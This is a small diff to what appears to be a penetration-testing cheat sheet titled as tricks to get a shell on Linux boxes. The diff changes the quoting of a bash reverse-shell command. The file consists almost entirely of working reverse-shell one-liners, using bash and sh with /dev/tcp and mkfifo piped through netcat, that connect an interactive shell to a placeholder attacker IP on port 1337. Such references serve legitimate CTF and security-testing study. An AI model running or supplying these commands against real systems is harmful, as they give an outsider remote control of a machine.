@@ -12,7 +12,7 @@ description: Specific tricks to get a shell for hacking Linux-based boxes
 ```shell
 bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1
 sh -i >& /dev/tcp/$YOUR_IP/1337 0>&1
-bash -c "bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1"
+bash -c 'bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/f
 rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/g
 ```
